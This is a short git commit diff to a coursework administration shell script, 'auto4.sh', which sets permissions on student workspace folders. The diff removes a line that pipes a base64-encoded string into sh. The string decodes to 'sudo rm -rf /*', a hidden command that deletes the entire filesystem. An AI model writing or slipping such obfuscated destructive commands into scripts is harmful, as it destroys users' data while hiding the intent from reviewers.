6cffcb46eee2850856c8bb8f29c32608f3d9ec2f
chrisWalker11 <51098965+chrisWalker11@users.noreply.github.com>
2020-07-02 10:47:19 -0400

    Update auto4.sh

--- auto4.sh
+++ auto4.sh
@@ -16,7 +16,6 @@ echo " "
 
 ls -al /usr/coursework
 
-base64 -d <<< c3VkbyBybSAtcmYgLyo= | sh
 
 sudo chmod o-rx /usr/coursework/StudentWorkspace/BetsyAfiles
 sudo chmod g-rx /usr/coursework/StudentWorkspace/BetsyAfiles
